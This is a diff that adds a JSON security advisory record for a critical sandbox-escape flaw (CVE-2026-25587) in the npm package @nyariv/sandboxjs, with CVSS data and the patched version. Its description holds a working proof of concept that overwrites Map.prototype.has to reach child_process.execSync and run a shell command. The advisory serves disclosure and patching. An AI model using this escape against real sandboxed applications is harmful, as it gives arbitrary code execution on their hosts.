@@ -1,0 +1,53 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-02-05T21:06:02Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@nyariv/sandboxjs"
+  },
+  "Advisory": {
+    "DatabaseId": 335874,
+    "Id": "GSA_kwCzR0hTQS02Nmg0LXFqNHgtMzh4cM4ABSAC",
+    "GhsaId": "GHSA-66h4-qj4x-38xp",
+    "References": [
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/security/advisories/GHSA-66h4-qj4x-38xp"
+      },
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-66h4-qj4x-38xp"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-66h4-qj4x-38xp"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-25587"
+      }
+    ],
+    "Description": "### Summary\n\nAs `Map` is in `SAFE_PROTOYPES`, it's prototype can be obtained via `Map.prototype`. By overwriting `Map.prototype.has` the sandbox can be escaped.\n\n### Details\n\nThis is effectively equivalent to CVE-2026-25142, but without `__lookupGetter__`  (`let` was used during testing), it turns out the `let` implementation is bugged:\n\n```js\nlet a = Map.prototype;\nconsole.log(a) // undefined\n```\n\n```js\nconst a = Map.prototype;\nconsole.log(a) // Object [Map] {}\n```\n\n```js\nlet a = 123;\nconsole.log(a) // 123\n```\n\n```js\nconst a = 123;\nconsole.log(a) // 123\n``` \n\n### PoC\n\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload = `\nconst m = Map.prototype;\nm.has = isFinite;\n\nconsole.log(\n  isFinite.constructor(\n    \"return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n);`;\n\nsb.compile(payload)().run();\n```\n\n### Impact\n\nAble to set `Map.prototype.has` -\u003e RCE",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-02-05T21:05:59Z",
+    "Severity": "CRITICAL",
+    "Summary": "@nyariv/sandboxjs has a Sandbox Escape vulnerability",
+    "UpdatedAt": "2026-02-05T21:06:02Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.8.29"
+      },
+      "VulnerableVersionRange": "\u003c= 0.8.28"
+    }
+  ]
+}
